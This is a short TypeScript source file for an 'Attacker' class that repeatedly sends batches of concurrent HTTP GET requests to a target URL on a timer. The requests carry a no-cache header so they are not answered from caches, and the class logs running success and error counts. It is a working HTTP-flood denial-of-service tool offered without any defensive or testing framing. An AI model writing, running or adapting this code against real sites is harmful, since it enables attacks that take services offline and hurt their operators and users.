import { Stats } from "./stats";
import superagent from "superagent";

export class Attacker {
    private instance: NodeJS.Timeout;
    constructor(private stats: Stats) { }
    run(target: string, concurrency: number, interval: number) {
        this.stop();
        this.stats.target = target;
        this.instance = setInterval(() => {
            for(let i = 0; i < concurrency; i += 1) {
                this.attack(target, interval);
            }
            this.stats.loop += 1;
            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.error}`);
        }, interval);
    }

    stop() {
        if(this.instance) clearInterval(this.instance);
        this.stats.reset();
    }

    private attack(target: string, timeout: number) {
        try{
            superagent
                .get(target)
                .set('Cache-Control', 'no-cache')
                .timeout(timeout)
                .end((err) => err ? this.stats.error += 1 : this.stats.success += 1);
        } catch(error) {
            console.error(error);
        }
    }
}